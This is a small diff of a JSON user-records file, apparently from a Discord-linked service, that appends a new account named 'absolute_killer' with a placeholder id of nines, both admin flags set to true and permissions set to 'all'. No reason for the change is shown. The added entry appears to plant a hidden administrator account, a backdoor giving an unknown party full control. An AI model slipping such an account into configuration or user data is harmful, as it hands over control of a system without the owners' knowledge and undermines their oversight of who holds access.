@@ -70,6 +70,17 @@
       "banReason": "",
       "bannedBy": "admin",
       "bannedAt": "2026-07-19T13:37:45.862Z"
+    },
+    {
+      "id": "999999999999999999",
+      "username": "absolute_killer",
+      "global_name": "Absolute Killer",
+      "avatar": "https://cdn.discordapp.com/embed/avatars/0.png",
+      "admin": true,
+      "isAdmin": true,
+      "permissions": [
+        "all"
+      ]
     }
   ],
   "bannedIPs": [],
